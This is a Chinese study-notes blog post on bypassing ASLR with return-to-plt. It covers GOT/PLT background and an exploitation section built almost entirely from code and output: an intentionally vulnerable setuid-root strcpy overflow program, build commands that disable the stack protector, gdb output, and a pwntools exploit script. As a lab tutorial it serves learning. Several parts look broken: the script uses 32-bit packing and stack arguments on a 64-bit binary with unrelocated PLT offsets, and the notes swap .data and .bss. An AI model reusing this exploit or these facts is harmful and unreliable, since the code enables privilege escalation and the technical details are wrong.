---
title: 二进制学习笔记1-ASLR绕过
date: 2024-03-21 21:52:47
categories:
- 二进制学习笔记
tags: 
- 二进制学习笔记
---

# 二进制保护机制原理和绕过技巧

[toc]

## 0x00 工具

- **peda**

```shell
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

- **readelf**

readelf的作用是**用来查看当前elf文件的符号表**，符号表中的信息只包括全局变量和函数名。 动态符号表(.synsym)用来保存与动态链接相关的导入导出符号，不包括模块内的符号；而systab表则保存所有的符号，包括.dynsym中的符号

```shell
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
```



## 0x01 ASLR

ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。

### 1. 绕过ASLR核心点 

- 开启ASLR后，libc的**基地址会变**，但是**函数的偏移量不会变**
- system 函数地址 = libc基地址 + 函数偏移量

![image-20240321222858287](C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321222858287.png)

![image-20240321222637434](C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321222637434.png)



### 2. return-to-plt技术

#### 2.1 背景知识

在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。

##### 2.1.1 Linux内存布局

![image-20240321224452523](C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321224452523.png)

- .text 汇编代码
- .data 无初始值的数据（静态变量，全局变量）
- .bss 有初始值的数据 （静态变量，全局变量）
- heap 堆
- shared object 共享对象区域（动态库所在）
- stack 栈
- kernel-area 内核区域



##### 2.1.2 静态函数库与动态函数库

静态函数库 —— 在程序运行前就已经被加载到目标程序里了

动态函数库 —— 在程序启动的时候被加载

不同于静态库的是，**共享库的text段在多个进程间共享**，**但它的数据段在每个进程中是唯一的**。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC! [4] 

<font color=red>**这句话非常重要！**<font>

##### 2.1.3 PIC（位置独立代码）

位置无关代码是指代码无论被加载到哪个地址上都可以正常执行。gcc选项中添加-fPIC会产生相关代码。

共享库的text段会指向数据段中的一个特定表，这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。



**简言之，既然我们想让共享函数库被多个进程共享，就要让它的.text段中的数据描述符和函数地址能被重定位。可是由于.text无法被写，我们只能通过PIC来间接寻址完成！**



#### 2.2 GOT（全局偏移表）& PLT（过程链接表）

##### 2.2.1 GOT

全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符。



##### 2.2.1 PLT

过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。**存根代码在动态链接器的帮助下，解析函数地址**并将其拷贝到GOT(GOT[n])中。**解析过程只发生在第一次调用函数(‘function’)的时候，之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)**。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址。

简言之：

- 第一次调用function时，动态链接器会解析function的地址，并拷贝到GOT(GOT(n))中
- 以后再次调用function时，只会调用存根代码(function@PLT)，而不会再次解析function的地址
- 存根代码会从GOT(GOT[n])里获取地址并跳转

**两层间接寻址：function@PLT -> GOT(GOT(n)) -> function addr**



## 0x02 漏洞利用

### 1. 漏洞代码

```C
#include <stdio.h> 
#include <string.h> 
void shell() {      //这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它

 system("/bin/sh");
 exit(0);
}

int main(int argc, char* argv[]) {
 int i=0;
 char buf[256];
 strcpy(buf,argv[1]);
 printf("%s\n",buf);
 return 0;
}
```



### 2. 编译

```shell
#echo 2 > /proc/sys/kernel/randomize_va_space 
$gcc -g -fno-stack-protector -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```



### 3. 调试

查看main函数的汇编

```shell
gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x000000000000118b <+0>:     push   rbp
   0x000000000000118c <+1>:     mov    rbp,rsp
   0x000000000000118f <+4>:     sub    rsp,0x120
   0x0000000000001196 <+11>:    mov    DWORD PTR [rbp-0x114],edi
   0x000000000000119c <+17>:    mov    QWORD PTR [rbp-0x120],rsi
   0x00000000000011a3 <+24>:    mov    DWORD PTR [rbp-0x4],0x0
   0x00000000000011aa <+31>:    mov    rax,QWORD PTR [rbp-0x120]
   0x00000000000011b1 <+38>:    add    rax,0x8
   0x00000000000011b5 <+42>:    mov    rdx,QWORD PTR [rax]
   0x00000000000011b8 <+45>:    lea    rax,[rbp-0x110]
   0x00000000000011bf <+52>:    mov    rsi,rdx
   0x00000000000011c2 <+55>:    mov    rdi,rax
   0x00000000000011c5 <+58>:    call   0x1030 <strcpy@plt>
   0x00000000000011ca <+63>:    lea    rax,[rbp-0x110]
   0x00000000000011d1 <+70>:    mov    rdi,rax
   0x00000000000011d4 <+73>:    call   0x1040 <puts@plt>
   0x00000000000011d9 <+78>:    mov    eax,0x0
   0x00000000000011de <+83>:    leave  
   0x00000000000011df <+84>:    ret    
End of assembler dump.
```

查看shell函数的汇编

```shell
gdb-peda$ disassemble shell
Dump of assembler code for function shell:
   0x0000000000001169 <+0>:     push   rbp
   0x000000000000116a <+1>:     mov    rbp,rsp
   0x000000000000116d <+4>:     lea    rax,[rip+0xe90]        # 0x2004
   0x0000000000001174 <+11>:    mov    rdi,rax
   0x0000000000001177 <+14>:    mov    eax,0x0
   0x000000000000117c <+19>:    call   0x1050 <system@plt>
   0x0000000000001181 <+24>:    mov    edi,0x0
   0x0000000000001186 <+29>:    call   0x1060 <exit@plt>
End of assembler dump.
```

找到'/bin/sh'的地址

```shell
gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
     vuln : 0x564f073e3004 --> 0x68732f6e69622f ('/bin/sh')
     vuln : 0x564f073e4004 --> 0x68732f6e69622f ('/bin/sh')
libc.so.6 : 0x7fe9a4c99117 --> 0x68732f6e69622f ('/bin/sh')
```



### 4. EXP

exp的构造，首先向缓冲区中填充256个字节的‘A’+向对齐空间中填充16字节的‘A’+ system@PLT的地址+exit@PLT的地址+system_arg的地址。

```python
from pwn import *
system = 0x1050
exit = 0x1060
system_arg = 0x559e0dd67004
payload="A" * 272+p32(system)+p32(exit)+p32(system_arg)
print payload
io= process(argv=['./vuln', payload])
io.interactive()
```



## 参考

[1] [绕过ASLR-一](https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/)

[2] [Linux常用保护机制](https://lantern.cool/note-pwn-linux-protect/index.html)

[3] [Pwn学习笔记2-内存布局](https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/)

[4] [bypassaslr-returntoplt](https://diting0x.github.io/20170101/bypassaslr-returntoplt/)

